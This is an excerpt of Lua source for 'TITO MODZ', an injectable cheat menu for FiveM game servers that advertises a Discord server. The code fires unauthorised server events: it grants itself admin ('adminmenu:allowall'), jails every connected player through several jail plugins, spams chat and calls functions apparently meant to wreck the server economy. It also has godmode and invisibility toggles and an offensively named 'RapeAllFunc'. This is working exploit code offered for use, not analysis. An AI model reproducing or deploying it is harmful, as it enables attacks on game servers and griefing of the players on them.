...
else aM("~h~Read #lynx-announcements on TITO MODZ discord.gg/ZtZMsyNnMq") end end;
local
...
function RapeAllFunc() for av = 0, 9 do TriggerServerEvent("adminmenu:allowall") TriggerServerEvent("_chat:messageEntered", "^1L^2y^3n^4x ^5R^6e^7v^8o^9l^1u^2t^3i^5o^4n", {
        ...
        "discord.gg/ZtZMsyNnMq - Cheats and Anti-Lynx") end;
...
Citizen.CreateThread(function() while bL do Citizen.Wait(0) SetPlayerInvincible(PlayerId(), Godmode) SetEntityInvincible(PlayerPedId(-1), Godmode) SetEntityVisible(GetPlayerPed(-1), dM, 0) if SuperJump
    ...
    if e.IsMenuOpened(bM) then cr("~p~TITO MODZ - 9.0 - "..d, 0.80, 0.9) a5("Welcome back ~p~"..d..
        " ~s~!", 0.5, 0.5) aM("~h~TITO MODZ - ~g~9~s~.~g~0", true) aM("~u~discord.gg/ZtZMsyNnMq~u~/", false) if e.MenuButton("~h~~p~#~s~ Self Menu", bO) then elseif e.MenuButton("~h~~p~#~s~ Online Players", bW) then elseif e.MenuButton("~h~~p~#~s~ Teleport Menu", bS) then elseif e.MenuButton("~h~~p~#~s~ Vehicle Menu", bV) then elseif e.MenuButton("~h~~p~#~s~ Weapon Menu", bT) then elseif e.MenuButton("~h~~p~#~s~ Lua Menu ~o~~h~:3", bQ) then elseif e.MenuButton("~h~~p~#~s~ Advanced Mode ~o~~h~xD", bU) then elseif e.MenuButton("~h~~p~# ~y~34ByTe Community", b_) then end; e.Display() elseif e.IsMenuOpened(bO) then a5("Stuff for yourself", 0.58, 0.58) if e.CheckBox("~h~~g~Godmode", Godmode, function(eC) Godmode = eC end) then elseif e.Button("~h~~y~Semi ~g~Godmode") then local eD = "stt_prop_stunt_soccer_ball"
    ...
    "TITO MODZ injected successfully!") end, false) RegisterCommand("lol", function(f3, f4, f5) haharip = true; bananapartyall() EconomyDy2() for i = 0, 128 do TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 5000, "lynxmenu.com - Cheats and Anti-Lynx") TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 45 * 60) TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 45 * 60) TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 45 * 60, "lynxmenu.com - Cheats and Anti-Lynx") TriggerServerEvent("ljail:jailplayer") end end, false) RegisterCommand("pk", function(f3, f4, f5) bL = false end, false)